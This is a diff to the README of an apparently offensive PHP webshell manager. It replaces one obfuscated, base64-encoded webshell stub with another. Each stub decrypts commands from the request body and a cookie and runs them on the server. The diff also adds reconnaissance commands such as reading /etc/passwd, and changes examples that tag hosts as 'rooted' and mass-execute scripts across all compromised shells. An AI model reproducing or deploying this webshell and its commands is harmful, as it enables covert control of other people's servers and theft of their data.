@@ -87,14 +87,14 @@ Typical shell (shell.php stub and b64.php cryptor):
 
 ```
 <?
-$LjfsRZF=null;
-$MLASbepHthx='GC1icrGC1ieGC1iGC1iaGC1ite_GC1iGC1ifGC1iGC1iuGC1iGC1inGC1iGC1ictGC1iioGC1inGC1i';
-$ThkYOrMKs=str_replace('GC1i',$LjfsRZF,$MLASbepHthx);
-$vycCUhApH='basemama64_mamademacomadmaema';
-$VPOaxRpSheGP=str_replace('ma',$LjfsRZF,$vycCUhApH);
-$wOACzfNSCaH='Ci8qY1JGOGJBUXEqL2Z1bmN0aW9uIGVuY3J5cHQoJGtleSwkc3RyKXskaXNlbXB0eT1lbXB0eSgkc3RyKXx8QGd6dW5jb21wcmVzcygkc3RyKT09PScnO2ZvcigkaWk9MDskaWk8c3RybGVuKCRrZXkpOyRpaSsrKXskc3RyID0gY2hyKG10X3JhbmQoKSUyNTYpLiRzdHI7fWZvcigkaWk9MCwkcmVzdWx0PScnLCRjdXJyZW50PTA7JGlpPHN0cmxlbigkc3RyKTskaWkrKyl7JGN1cnJlbnQ9b3JkKCRzdHJbJGlpXSleQG9yZCgka2V5WyRpaSVzdHJsZW4oJGtleSldKV4kY3VycmVudDskcmVzdWx0Lj1jaHIoJGN1cnJlbnQpO31yZXR1cm4gKCEkaXNlbXB0eSk/JHJlc3VsdDonJzt9ZnVuY3Rpb24gZGVjcnlwdCgka2V5LCRzdHIpe2ZvcigkaWk9MCwkcmVzdWx0PScnLCRjdXJyZW50PTA7JGlpPHN0cmxlbigkc3RyKTskaWkrKyl7JHJlc3VsdC49Y2hyKG9yZCgkc3RyWyRpaV0pXkBvcmQoJGtleVskaWklc3RybGVuKCRrZXkpXSleJGN1cnJlbnQpOyRjdXJyZW50PW9yZCgkc3RyWyRpaV0pO31yZXR1cm4oIWVtcHR5KCRzdHIpKT9zdWJzdHIoJHJlc3VsdCxzdHJsZW4oJGtleSkpOicnO31mdW5jdGlvbiBzaGVsbCgpIHtAb2Jfc3RhcnQoKTska2V5PSdhMTU0NzZlMWY4MDJlZjNjYTYyZDZhYTQyOTI3NDBlYic7JG1vZD1AZ3p1bmNvbXByZXNzKGRlY3J5cHQoJGtleSxwYWNrKCdIKicsQGZpbGVfZ2V0X2NvbnRlbnRzKCdwaHA6Ly9pbnB1dCcpKSkpOyRjbWQ9QGd6dW5jb21wcmVzcyhkZWNyeXB0KCRrZXkscGFjaygnSConLEAkX0NPT0tJRVsnRVZJTCddKSkpOyR0bXA9dGVtcG5hbShudWxsLG51bGwpO2ZpbGVfcHV0X2NvbnRlbnRzKCR0bXAsJzw/cGhwICcuJG1vZC4kY21kLicgPz4nKTt0cnl7IGluY2x1ZGUoJHRtcCk7IH1jYXRjaChFeGNlcHRpb24gJGUpe30kcj11bnBhY2soJ0gqJyxlbmNyeXB0KCRrZXksQGd6Y29tcHJlc3MoQG9iX2dldF9jbGVhbigpLDkpKSk7ZWNobyAkclsxXTt9c2hlbGwoKTs=';
-$aqkfgn=$ThkYOrMKs($LjfsRZF,$VPOaxRpSheGP($wOACzfNSCaH));
-$aqkfgn();
+$dYtKLa=null;
+$XmzZZB='n5fgacrn5fgaean5fgate_fn5fgan5fgaunctin5fgaonn5fga';
+$myC_YojOmE=str_replace('n5fga',$dYtKLa,$XmzZZB);
+$bXxLybtZj='base25aWp25aWp625aWp4_25aWpd25aWp25aWpecod25aWpe25aWp';
+$QRGzlAVFD=str_replace('25aWp',$dYtKLa,$bXxLybtZj);
+$RMWnbJn_mqQ='CS8qd0lhWSovZnVuY3Rpb24gZW5jcnlwdCgka2V5LCRwYXNzLCRzdHIpeyRpc2VtcHR5PWVtcHR5KCRzdHIpfHxAZ3p1bmNvbXByZXNzKCRzdHIpPT09Jyc7JHN0cj0kcGFzcy4kc3RyOyRrZXlzaXplPXN0cmxlbigka2V5KTtmb3IoJGlpPTA7JGlpPCRrZXlzaXplOyRpaSsrKXskc3RyPWNocihtdF9yYW5kKCklMjU2KS4kc3RyO31mb3IoJGlpPTAsJHJlc3VsdD0nJywkY3VycmVudD0wOyRpaTxzdHJsZW4oJHN0cik7JGlpKyspeyRjdXJyZW50PW9yZCgkc3RyWyRpaV0pXkBvcmQoJGtleVskaWklJGtleXNpemVdKV4kY3VycmVudDskcmVzdWx0Lj1jaHIoJGN1cnJlbnQpO31yZXR1cm4oISRpc2VtcHR5KT8kcmVzdWx0OicnO31mdW5jdGlvbiBkZWNyeXB0KCRrZXksJHBhc3MsJHN0cil7JGtleXNpemU9c3RybGVuKCRrZXkpO2ZvcigkaWk9MCwkcmVzdWx0PScnLCRjdXJyZW50PTA7JGlpPHN0cmxlbigkc3RyKTskaWkrKyl7JHJlc3VsdC49Y2hyKG9yZCgkc3RyWyRpaV0pXkBvcmQoJGtleVskaWklJGtleXNpemVdKV4kY3VycmVudCk7JGN1cnJlbnQ9b3JkKCRzdHJbJGlpXSk7fXJldHVybighZW1wdHkoJHN0cikmJnN1YnN0cigkcmVzdWx0LCRrZXlzaXplLCRrZXlzaXplKT09PSRwYXNzKT9zdWJzdHIoJHJlc3VsdCwyKiRrZXlzaXplKTonJzt9ZnVuY3Rpb24gc2hlbGwoKSB7QG9iX3N0YXJ0KCk7JGtleT1wYWNrKCdIKicsJzlhNjQyYzRjM2VlMThhMThmY2JlN2E5NTEwMDRjOGVhJyk7JHBhc3M9cGFjaygnSConLCc2YzBkMGQ5MzAzZWU0MjQ0NDhmMTRmYWMxZGZmY2Y4YScpOyRtb2Q9QGd6dW5jb21wcmVzcyhkZWNyeXB0KCRrZXksJHBhc3MscGFjaygnSConLEBmaWxlX2dldF9jb250ZW50cygncGhwOi8vaW5wdXQnKSkpKTskY21kPUBnenVuY29tcHJlc3MoZGVjcnlwdCgka2V5LCRwYXNzLHBhY2soJ0gqJyxAJF9DT09LSUVbJ1BIUFNFU1NJRCddKSkpOyR0bXA9dGVtcG5hbShudWxsLG51bGwpO2ZpbGVfcHV0X2NvbnRlbnRzKCR0bXAsJzw/cGhwICcuJG1vZC4kY21kLicgPz4nKTt0cnl7aW5jbHVkZSgkdG1wKTt9Y2F0Y2goRXhjZXB0aW9uICRlKXt9JHI9dW5wYWNrKCdIKicsZW5jcnlwdCgka2V5LCRwYXNzLEBnemNvbXByZXNzKEBvYl9nZXRfY2xlYW4oKSw5KSkpO2VjaG8gJHJbMV07fXNoZWxsKCk7';
+$jTOWXgk=$myC_YojOmE($dYtKLa,$QRGzlAVFD($RMWnbJn_mqQ));
+$jTOWXgk();
 ?>
 ```
 
@@ -167,6 +167,8 @@ Execute commands:
 ls
 pwd
 id
+uname -a
+cat /etc/passwd
 ```
 
 Shell mode uses a special `@` escape symbol for commands.
@@ -295,10 +297,10 @@ Leave shell via ctrl+c.
 Create a comment for @haxhaxhax:
 
 ```
-comment @haxhaxhax "lol! rooted"
+comment @haxhaxhax "lulz rooted"
 ```
 
-Search for shell by comment and domain:
+Search for shells by comment and domain:
 
 ```
 search comment:"rooted" domain:*.tld
@@ -307,13 +309,13 @@ search comment:"rooted" domain:*.tld
 Execute script on all shells:
 
 ```
-select active:True|script kernel
+select domain:*|script kernel
 ```
 
 Execute command on specific shells:
 
 ```
-select comment:rooted|cmd id
+select comment:rooted|cmd uname -a;id
 ```
 
 Run `help` command for more information (on each module).
